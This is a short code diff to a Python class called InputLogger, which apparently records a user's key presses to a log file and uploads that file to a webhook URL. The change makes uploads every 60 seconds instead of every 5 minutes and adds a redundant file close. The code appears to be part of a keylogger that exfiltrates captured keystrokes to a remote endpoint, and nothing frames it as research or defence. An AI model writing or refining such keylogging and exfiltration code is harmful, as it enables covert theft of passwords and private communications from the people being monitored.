@@ -11,7 +11,7 @@ class InputLogger:
         self.log_file = os.path.join(
             get_logs_path(self.software_dir_name), "input_log.txt"
         )
-        self.interval = 300  # once every 5 minutes
+        self.interval = 60
         self.current_logs = ""
 
     def on_press(self, key):
@@ -39,6 +39,7 @@ class InputLogger:
                 with open(self.log_file, "w") as f:
                     f.write("Input Logs:\n\n")
                     f.write(self.current_logs)
+                    f.close()
                 send_webhook(
                     self.webhook_url, file={"input_logs.txt": open(self.log_file, "rb")}
                 )
